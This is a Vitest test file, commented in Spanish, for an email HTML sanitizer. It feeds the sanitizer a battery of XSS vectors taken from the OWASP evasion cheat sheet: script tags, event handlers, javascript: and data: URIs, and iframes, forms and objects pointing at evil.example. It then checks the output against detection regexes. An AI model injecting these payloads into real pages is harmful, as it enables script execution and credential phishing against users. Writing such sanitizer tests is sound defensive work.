/**
 * Batería XSS (vectores de la OWASP XSS Filter Evasion Cheat Sheet adaptados a correo).
 * El HTML saneado no debe contener scripts, manejadores de eventos, esquemas peligrosos,
 * iframes, formularios, objetos ni CSS ejecutable.
 */
import { describe, expect, it } from 'vitest';
import { htmlToPlainText, sanitizeEmailHtml } from './email-sanitizer';
import { LiquidProtector } from './liquid-engine';

const XSS_VECTORS = [
  '<script>alert(1)</script>',
  '<SCRIPT SRC=https://xss.example/xss.js></SCRIPT>',
  '<img src=x onerror=alert(1)>',
  '<IMG SRC="javascript:alert(\'XSS\');">',
  '<IMG SRC=JaVaScRiPt:alert(1)>',
  '<img src="jav&#x09;ascript:alert(1)">',
  '<a href="javascript:alert(1)">clic</a>',
  '<a href="JAVASCRIPT:alert(1)">clic</a>',
  '<a href=" &#14;  javascript:alert(1)">clic</a>',
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">clic</a>',
  '<a href="vbscript:msgbox(1)">clic</a>',
  '<svg onload=alert(1)><circle r="10"/></svg>',
  '<svg><script>alert(1)</script></svg>',
  '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
  '<iframe src="https://evil.example"></iframe>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<object data="https://evil.example/x.swf"></object>',
  '<embed src="https://evil.example/x.swf">',
  '<form action="https://evil.example"><input name="password"><button>Enviar</button></form>',
  '<body onload=alert(1)>hola</body>',
  '<div onmouseover="alert(1)">pasa</div>',
  '<p style="background:url(javascript:alert(1))">x</p>',
  '<p style="width: expression(alert(1))">x</p>',
  '<div style="behavior: url(xss.htc)">x</div>',
  '<style>@import "https://evil.example/x.css";</style><p>x</p>',
  '<link rel="stylesheet" href="https://evil.example/x.css">',
  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  '<base href="https://evil.example/">',
  '<table background="javascript:alert(1)"><tr><td>x</td></tr></table>',
  '<img src="https://ok.example/a.png" alt="ok" onerror="alert(1)">',
  '<a href="https://ok.example" onclick="alert(1)">ok</a>',
  '"><script>alert(1)</script>',
  '<scr<script>ipt>alert(1)</script>',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  '<textarea><script>alert(1)</script></textarea>',
  '<video><source onerror="alert(1)"></video>',
  '<details open ontoggle=alert(1)>',
  '<marquee onstart=alert(1)>x</marquee>',
  '<img src="//evil.example/x.png" alt="x">',
];

const DANGEROUS_OUTPUT = [
  /<script/i,
  /<iframe/i,
  /<object/i,
  /<embed/i,
  /<form/i,
  /<input/i,
  /<svg/i,
  /<math/i,
  /<style/i,
  /<link/i,
  /<meta/i,
  /<base/i,
  /<video/i,
  /<details/i,
  /<textarea/i,
  /\son[a-z]+\s*=/i,
  /javascript:/i,
  /vbscript:/i,
  /data:text\/html/i,
  /expression\s*\(/i,
  /url\s*\(/i,
  /behavior\s*:/i,
  /src="\/\//i,
];

describe('sanitizeEmailHtml', () => {
  it.each(XSS_VECTORS)('neutraliza %s', (vector) => {
    const { html } = sanitizeEmailHtml(vector, new LiquidProtector());
    for (const pattern of DANGEROUS_OUTPUT) {
      expect(html).not.toMatch(pattern);
    }
  });

  it('conserva el HTML de correo legítimo (tablas, estilos seguros, enlaces https)', () => {
    const source = `<style>.title { color: #005E7D; font-size: 22px; }</style>
<table width="100%" cellpadding="0"><tr><td align="center" bgcolor="#ffffff">
<h1 class="title">Novedades</h1><p style="margin: 0 0 16px 0">Texto <strong>importante</strong></p>
<a href="https://multicomputos.com" target="_blank">Ver</a>
<img src="https://cdn.example/a.png" alt="Banner" width="600"></td></tr></table>`;
    const result = sanitizeEmailHtml(source, new LiquidProtector());

    expect(result.html).toContain('<table');
    expect(result.html).toContain('color:#005E7D');
    expect(result.html).toContain('href="https://multicomputos.com"');
    expect(result.html).toContain('alt="Banner"');
    expect(result.removedUnsafeContent).toBe(false);
  });

  it('informa cuando elimina contenido peligroso', () => {
    expect(
      sanitizeEmailHtml('<p onclick="x()">a</p>', new LiquidProtector()).removedUnsafeContent,
    ).toBe(true);
    expect(
      sanitizeEmailHtml('<a href="javascript:x()">a</a>', new LiquidProtector())
        .removedUnsafeContent,
    ).toBe(true);
  });

  it('cuenta imágenes sin alt y enlaces inseguros', () => {
    const result = sanitizeEmailHtml(
      '<img src="https://a.example/x.png"><a href="http://a.example">x</a>',
      new LiquidProtector(),
    );
    expect(result.imagesWithoutAlt).toBe(1);
    expect(result.insecureLinks).toBe(1);
  });

  it('solo admite variables de sistema en los enlaces', () => {
    const protector = new LiquidProtector();
    const source = protector.protect(
      '<a href="{{ unsubscribe_url }}">baja</a><a href="{{ contact.website }}">web</a>',
    );
    const html = protector.restore(sanitizeEmailHtml(source, protector).html);
    expect(html).toContain('href="{{ unsubscribe_url }}"');
    expect(html).not.toContain('contact.website');
  });
});

describe('htmlToPlainText', () => {
  it('convierte bloques en saltos de línea y conserva el destino de los enlaces', () => {
    const text = htmlToPlainText('<h1>Hola</h1><p>Ver <a href="https://x.com">sitio</a></p>');
    expect(text).toContain('Hola\n');
    expect(text).toContain('sitio (https://x.com)');
  });
});
